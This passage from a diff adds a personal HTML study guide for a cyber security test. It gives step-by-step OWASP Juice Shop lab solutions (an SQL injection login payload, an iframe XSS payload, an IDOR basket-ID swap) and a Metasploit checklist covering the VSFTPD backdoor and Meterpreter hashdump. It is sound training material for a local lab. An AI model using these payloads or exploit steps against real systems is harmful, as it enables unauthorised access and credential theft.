+    <p>The Score Board page lists <em>every</em> challenge and ticks them off as you solve them. It is hidden on purpose — finding it is itself the first challenge ("Score Board").</p>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Just change the address</h4>
+        <p>The simplest reliable method: edit the address in your browser to:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Type in browser address bar</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>http://localhost:3000/#/score-board</code></pre></div>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Confirm it worked</h4>
+        <p>The Score Board opens, a success notification appears ("Score Board" challenge solved), and you can now see all challenges grouped by difficulty — 1-star challenges are the easiest. <strong>Keep this page open in a second tab</strong> during the test: after each challenge, refresh it to confirm your tick appeared.</p>
+      </div></div>
+    </div>
+    <p><em>How would you find it without knowing the address?</em> The route name is hidden in the site's own code — press <strong>F12</strong> (Developer Tools), search the page source for "score", and the path appears. You only need the direct address for the test, but knowing this explains <em>why</em> it works if the examiner asks.</p>
+
+    <h3 class="sub">Challenge 1 — SQL Injection: log in as the admin without the password</h3>
+    <p><strong>The idea:</strong> the login box builds a database query using whatever you type. If you type a special piece of SQL code instead of an email, you can trick the query into letting you in as the first user in the database — who is the administrator.</p>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div><h4>Go to the Login page</h4><p>Click the account icon (top right) → <strong>Login</strong>.</p></div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Type the injection in the Email box</h4>
+        <div class="payload"><small>Copy exactly — including the apostrophe and the two dashes</small>' OR 1=1--</div>
+        <p>In the <strong>Password</strong> box, type anything at all, e.g. <code>test</code>. The password does not matter.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div><h4>Click Log in</h4><p>You are logged in — as the <strong>administrator</strong>. A notification confirms the "Login Admin" challenge is solved. Check the Score Board tab to see the tick.</p></div></div>
+    </div>
+    <div class="remember"><p><strong>Why it works (say this if asked):</strong> <code>'</code> closes the email text early, <code>OR 1=1</code> adds a condition that is always true, and <code>--</code> comments out the rest of the query — including the password check. So the database returns the first user it finds: the admin.</p></div>
+    <div class="callout warn"><b class="t">Common mistake</b><p>Forgetting the apostrophe at the start, or the space before <code>--</code>. Copy the payload character by character: <code>'</code> space <code>OR</code> space <code>1=1--</code></p></div>
+
+    <h3 class="sub">Challenge 2 — XSS: make the search box pop up an alert</h3>
+    <p><strong>The idea:</strong> XSS (Cross-Site Scripting) means the website displays what you typed <em>as code</em> instead of as plain text. If your code runs in the browser, the challenge is solved.</p>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div><h4>Click the search icon</h4><p>Click the magnifying glass (top right of the shop) so the search box opens.</p></div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Type this payload and press Enter</h4>
+        <div class="payload"><small>Copy exactly — note the backtick characters ` around xss</small>&lt;iframe src="javascript:alert(`xss`)"&gt;</div>
+        <p>Those are <strong>backticks</strong> (the key above Tab, next to 1) around the word xss — not normal apostrophes.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div><h4>An alert box pops up</h4><p>An alert saying <code>xss</code> appears on screen. That popup <em>is</em> the proof — the "DOM XSS" challenge is solved. Click OK and check your Score Board tick.</p></div></div>
+    </div>
+    <div class="callout tip"><b class="t">💡 If the first payload does not pop up</b><p>Make sure you pressed Enter so the search actually ran, and re-check the backticks. A second payload that also solves it: search for the same iframe code again after refreshing the page — Juice Shop sometimes needs the results page to fully load.</p></div>
+
+    <h3 class="sub">Challenge 3 — View another user's basket</h3>
+    <p><strong>The idea:</strong> every basket has a number (an ID). The shop checks <em>who you are</em> when you log in — but it forgets to check <em>whose basket you are asking for</em>. So if you change the basket number, you can see someone else's basket. This type of flaw is called <strong>IDOR / Broken Access Control</strong>.</p>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Create your own account and log in</h4>
+        <p>Account icon → <strong>Login</strong> → <em>Not yet a customer?</em> Register with any email and password, e.g. <code>sadaf@test.com</code>. Then log in with it.</p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Add any product to your basket</h4>
+        <p>Click <strong>Add to Basket</strong> on any juice, then click the basket icon. Notice your basket opens — this is <em>your</em> basket, with its own ID number working behind the scenes.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4>Open Developer Tools and watch the basket request</h4>
+        <p>Press <strong>F12</strong> → click the <strong>Network</strong> tab → refresh the basket page (F5). In the list of requests, find the one named like <code>basket/2</code> (the number is <em>your</em> basket ID — yours may be a different number). Click it and look at the <strong>Response</strong>: it shows your basket's contents as data.</p>
+      </div></div>
+      <div class="step"><div class="n">4</div><div>
+        <h4>Ask for basket number 1 directly</h4>
+        <p>In a new browser tab, type this address — it asks the shop's API for basket 1, which belongs to another user (the admin):</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Type in browser address bar</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>http://localhost:3000/rest/basket/1</code></pre></div>
+        <p><strong>Easier visual method:</strong> while on your basket page, open the browser's storage — press F12 → <strong>Application</strong> tab → <strong>Local Storage</strong> → find the <code>bid</code> value, change it to <code>1</code>, then refresh the basket page. Your basket page now displays the other user's items.</p>
+      </div></div>
+      <div class="step"><div class="n">5</div><div>
+        <h4>Confirm on the Score Board</h4>
+        <p>The "View another user's shopping basket" challenge is marked solved, and you can see items you never added. That difference — <em>their</em> items on <em>your</em> screen — is the proof the examiner wants to see.</p>
+      </div></div>
+    </div>
+    <div class="remember"><p><strong>Why it works (say this if asked):</strong> the shop trusted the basket ID sent by the browser and never checked that the basket belongs to the logged-in user. Changing the ID is enough — no password needed. The fix would be to check ownership on the server for every request.</p></div>
+
+    <div class="grid2">
+      <div class="mini-card">
+        <h4>Easy extra challenges (if a question asks for more)</h4>
+        <ul>
+          <li><strong>Zero Stars:</strong> go to the Contact page and submit feedback without giving any star rating — just write text and submit.</li>
+          <li><strong>Confidential Document:</strong> open <code>http://localhost:3000/ftp</code> — a hidden file listing — and download <code>acquisitions.md</code>.</li>
+          <li><strong>Error Handling:</strong> visit a nonsense address like <code>http://localhost:3000/#/search?q=test%27</code> style broken input, or any invalid page, to trigger a raw error page.</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <h4>If Juice Shop will not open</h4>
+        <ul>
+          <li>Is the <code>docker run</code> terminal still open and showing "listening on port 3000"?</li>
+          <li>Run <code>sudo docker ps</code> — is the container listed?</li>
+          <li>Did you type <code>localhost:3000</code> exactly, with <code>http://</code>?</li>
+          <li>Port busy? Stop the old container (<code>sudo docker stop</code> + container ID from <code>docker ps</code>) and run again.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- CHECKLIST -->
+  <section id="checklist">
+    <div class="sec-head">
+      <span class="kicker">Last 15 minutes tonight</span>
+      <h2>Quick revision checklist</h2>
+      <p>Go through this list out loud. If you can explain or do every item without looking, you are ready. Anything you cannot do — scroll back to that part and practise it once more.</p>
+    </div>
+
+    <h3 class="sub">Metasploit — I can…</h3>
+    <ul class="checklist">
+      <li><b>Start it</b><span><code>sudo msfconsole</code> and recognise the <code>msf6 &gt;</code> prompt</span></li>
+      <li><b>Say the 5-step flow</b><span>search → use → show options → set → exploit</span></li>
+      <li><b>Explain RHOSTS vs LHOST</b><span>RHOSTS = target's IP · LHOST = my IP</span></li>
+      <li><b>Find a target's IP &amp; services</b><span><code>ifconfig</code> on target, <code>nmap -sV</code> from Ubuntu</span></li>
+      <li><b>Do the VSFTPD example</b><span>search vsftpd → use backdoor → set RHOSTS → exploit → whoami = root</span></li>
+      <li><b>Use 5 Meterpreter commands</b><span>sysinfo, getuid, ps, hashdump, background</span></li>
+      <li><b>Recover a stuck session</b><span><code>sessions</code> to list, <code>sessions -i 1</code> to re-enter</span></li>
+      <li><b>Troubleshoot a failed exploit</b><span>ping first, re-check RHOSTS, confirm version with nmap</span></li>
+    </ul>
+
+    <h3 class="sub">Juice Shop — I can…</h3>
+    <ul class="checklist">
+      <li><b>Start it with Docker</b><span><code>docker run --rm -p 3000:3000 bkimminich/juice-shop</code></span></li>
+      <li><b>Open it</b><span><code>http://localhost:3000</code> in the browser</span></li>
+      <li><b>Open the Score Board</b><span><code>http://localhost:3000/#/score-board</code></span></li>
+      <li><b>Do the SQL injection login</b><span>Email: <code>' OR 1=1--</code> — any password — logged in as admin</span></li>
+      <li><b>Explain the SQL payload</b><span><code>'</code> closes text, <code>OR 1=1</code> always true, <code>--</code> comments out password check</span></li>
+      <li><b>Do the XSS</b><span>Search: <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> → alert pops up</span></li>
+      <li><b>View another user's basket</b><span>Change basket ID to 1 via <code>/rest/basket/1</code> or the <code>bid</code> value</span></li>
+      <li><b>Name the basket flaw</b><span>Broken Access Control / IDOR — no ownership check</span></li>
+    </ul>
+
+    <div class="callout good">
+      <b class="t">Tonight's practice plan (about 1 hour)</b>
+      <p><strong>25 min:</strong> Run the full VSFTPD example once, start to finish, without reading — only peek when stuck. <strong>25 min:</strong> Start Juice Shop fresh and solve all 3 challenges in a row. <strong>10 min:</strong> Read this checklist aloud and explain each "why it works" in your own words. Then stop and rest — a fresh mind tomorrow beats one more hour tonight.</p>
+    </div>
+  </section>
+
+  <footer>
+    <p><strong>Good luck tomorrow, Sadaf.</strong> Remember: read all 3 questions, do your strongest one first, and check the simple things (IP, port, is it running?) before worrying. You have practised every step on this page — trust the practice.</p>
+    <p>Prepared for Sadaf Hassan's Cyber Security test · Topics: Metasploit on Ubuntu &amp; OWASP Juice Shop · For use only on your own lab machines, as in your test.</p>
+    <p style="margin-top:14px;font-weight:700;color:var(--ink)">Created by Taha</p>
+  </footer>
+
+</div>
+
+<script>
+  // Copy buttons
+  document.querySelectorAll('[data-copy]').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var pre = btn.closest('.codeblock').querySelector('pre code');
+      var text = pre ? pre.innerText : '';
+      function done(){
+        var old = btn.textContent;
+        btn.textContent = 'Copied ✓';
+        setTimeout(function(){ btn.textContent = old; }, 1600);
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done).catch(function(){ fallback(); });
+      } else { fallback(); }
+      function fallback(){
+        var ta = document.createElement('textarea');
+        ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  // Active nav highlighting
+  var links = Array.prototype.slice.call(document.querySelectorAll('#navInner a'));
+  var sections = links.map(function(a){ return document.querySelector(a.getAttribute('href')); }).filter(Boolean);
+  function onScroll(){
+    var pos = window.scrollY + 120, current = 0;
+    sections.forEach(function(s, i){ if (s.offsetTop <= pos) current = i; });
+    links.forEach(function(a, i){ a.classList.toggle('active', i === current); });
+  }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+</script>
+</body>
+</html>
